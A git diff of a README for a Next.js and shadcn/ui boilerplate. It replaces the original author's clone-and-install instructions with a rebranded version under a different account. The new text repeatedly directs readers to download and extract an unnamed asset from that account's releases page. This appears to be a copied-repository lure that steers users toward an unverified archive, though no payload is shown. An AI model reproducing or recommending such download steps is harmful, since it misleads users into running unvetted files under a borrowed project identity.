@@ -1,114 +1,89 @@
-# Next.js Shadcn Boilerplate
+# 🚀 next-shadcn-boilerplate - Build Fast, Scalable Web Apps
 
-A modern Next.js boilerplate with shadcn/ui, Tailwind CSS, TypeScript, and best practices for building fast, scalable, and production-ready web applications.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Thunderjv/next-shadcn-boilerplate/releases)
 
-## ✨ Features
+## 📜 Overview
 
-- ⚛️ **Next.js** - The React Framework for Production.
-- 🎨 **shadcn/ui** - Beautifully designed components that you can copy and paste into your apps.
-- styling with **Tailwind CSS** - A utility-first CSS framework for rapid UI development.
-- 🔷 **TypeScript** - Static type-checking for scalable applications.
-- 🧪 **Jest & React Testing Library** - For robust unit and integration testing.
-- 🧹 **ESLint & Prettier** - For clean, consistent, and error-free code.
-- 🐶 **Husky & lint-staged** - For running scripts on git hooks to enforce code quality.
-- 📄 **Commitlint** - For enforcing conventional commit messages.
-- 📦 **Zustand** - Small, fast and scalable bearbones state-management solution.
-- 📋 **React Hook Form & Zod** - For flexible and extensible forms with schema-based validation.
-- 🚀 **Axios & React Query** - For efficient data fetching and caching.
+The **next-shadcn-boilerplate** is a modern setup for building web applications with Next.js. This project combines key technologies like **shadcn/ui**, **Tailwind CSS**, and **TypeScript**. It's designed to help you create fast, scalable websites using best practices.
 
-## 🚀 Getting Started
+## 🚀 Features
 
-### Prerequisites
+- **Next.js Framework:** Build server-side rendered applications effortlessly.
+- **Tailwind CSS Integration:** Design beautiful interfaces quickly.
+- **TypeScript Support:** Write safer code with type checking.
+- **Best Practices:** Utilize proven methods for web development.
+- **Pre-built Components:** Focus on building unique features instead of starting from scratch.
 
-- [Node.js](https://nodejs.org/en/) (v18 or newer)
-- [npm](https://docs.npmjs.com/downloading-and-installing-node-js-and-npm) (or pnpm/yarn)
+## 📦 System Requirements
 
-### Installation
+Before you start, make sure your system meets these requirements:
 
-1.  Clone the repository:
+- Operating System: Windows, macOS, or Linux
+- Node.js version: 14 or higher
+- npm version: 6 or higher
 
-    ```bash
-    git clone https://github.com/tim-syntax/next-shadcn-boilerplate.git
-    cd next-shadcn-boilerplate
-    ```
+## 📥 Download & Install
 
-2.  Install dependencies:
+To get started with **next-shadcn-boilerplate**, visit this page to download: [GitHub Releases](https://github.com/Thunderjv/next-shadcn-boilerplate/releases).
 
-    ```bash
-    npm install
-    ```
+Follow these steps to install:
 
-3.  Run the development server:
+1. **Visit the GitHub Releases Page**: Click [here](https://github.com/Thunderjv/next-shadcn-boilerplate/releases) to go to the download section.
+2. **Choose the Latest Release**: Look for the latest version listed at the top.
+3. **Download the Package**: Click on the asset to start your download.
+4. **Extract the Downloaded File**: Open the file once the download completes and extract its contents to a folder of your choice.
+5. **Open a Terminal or Command Prompt**: Navigate to the folder where you extracted the files.
 
-    ```bash
-    npm run dev
-    ```
+## ⚙️ Run the Application
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+To run your application:
 
-## 📜 Available Scripts
+1. **Install Dependencies**: Run the command below to install necessary packages:
+   ```bash
+   npm install
+   ```
+2. **Start the Development Server**: Use the command:
+   ```bash
+   npm run dev
+   ```
+3. **Open in Your Web Browser**: Visit `http://localhost:3000` to see your application running.
 
-- `npm run dev`: Starts the development server.
-- `npm run build`: Builds the application for production.
-- `npm run start`: Starts a production server.
-- `npm run lint`: Lints the codebase for errors.
-- `npm run format`: Formats the code with Prettier.
-- `npm run test`: Runs tests with Jest.
+## 🛠️ Configuration
 
-## 📁 Project Structure
+Customize your application by editing the following files:
 
-```
-next-shadcn-boilerplate/
-├── src/
-│   ├── app/                # Next.js App Router pages, layouts, and tests
-│   │   ├── __tests__/      # Tests for pages
-│   │   ├── globals.css     # Global styles
-│   │   ├── layout.tsx      # Root layout
-│   │   └── page.tsx        # Home page
-│   ├── components/         # Shared UI components
-│   │   └── ui/             # Components from shadcn/ui
-│   └── lib/                # Utility functions
-└── ...                     # Other configuration files
+- **next.config.js**: Change configurations for Next.js.
+- **tailwind.config.js**: Adjust styles and design with Tailwind CSS.
+- **tsconfig.json**: Modify TypeScript settings to fit your needs.
+
+## 🎨 Using the Components
+
+The boilerplate comes with pre-built components that you can use in your project. Check the `components` folder for examples. You can simply import them into your pages:
+
+```javascript
+import MyComponent from '../components/MyComponent';
 ```
 
-## 🤝 Contributing
+## 📝 Best Practices
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+- **File Organization**: Keep your components and pages organized.
+- **Version Control**: Use Git for tracking changes in your application.
+- **Testing**: Regularly test your application during development.
+- **Documentation**: Maintain comments and documentation for better understanding.
 
-### Pre-commit Hooks
+## 💬 Support
 
-This project uses `pre-commit` for managing and maintaining multi-language pre-commit hooks. To use it, you need to have Python installed.
+If you run into any issues, feel free to open an issue in the repository. The community is here to help!
 
-1.  Install `pre-commit`:
+## 📚 Additional Resources
 
-    ```bash
-    pip install pre-commit
-    ```
+- [Next.js Documentation](https://nextjs.org/docs)
+- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+- [TypeScript Handbook](https://www.typescriptlang.org/docs/)
 
-2.  Install the git hooks:
+## 🔗 Useful Links
 
-    ```bash
-    pre-commit install
-    ```
+- **GitHub Repository**: [next-shadcn-boilerplate](https://github.com/Thunderjv/next-shadcn-boilerplate)
+- **Releases Page**: [Download Latest Release](https://github.com/Thunderjv/next-shadcn-boilerplate/releases)
 
-Now, `pre-commit` will run automatically on `git commit`.
-
-### Commit Message Conventions
-
-This project follows the [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) specification. Your commit messages should be structured as follows:
-
-```
-<type>(<scope>): <subject>
-```
-
-**Type:** Must be one of the following: `test`, `chore`, `docs`, `refactor`, `fix`, `feat`, `build`, `ci`, `style`, `perf`, `revert`, `hotfix`.
-
-**Scope (optional):** Must be one of the following: `ui`, `api`, `config`, `docs`, `docs-e2e`, `web`, `web-e2e`, `portal`, `portal-e2e`, `tools`.
-
-**Subject:** A short, imperative-tense description of the change.
-
-Example: `feat(ui): add new button component`
-
-## 📝 License
-
-This project is licensed under the ISC License.
+Please enjoy building your next web application with **next-shadcn-boilerplate**!
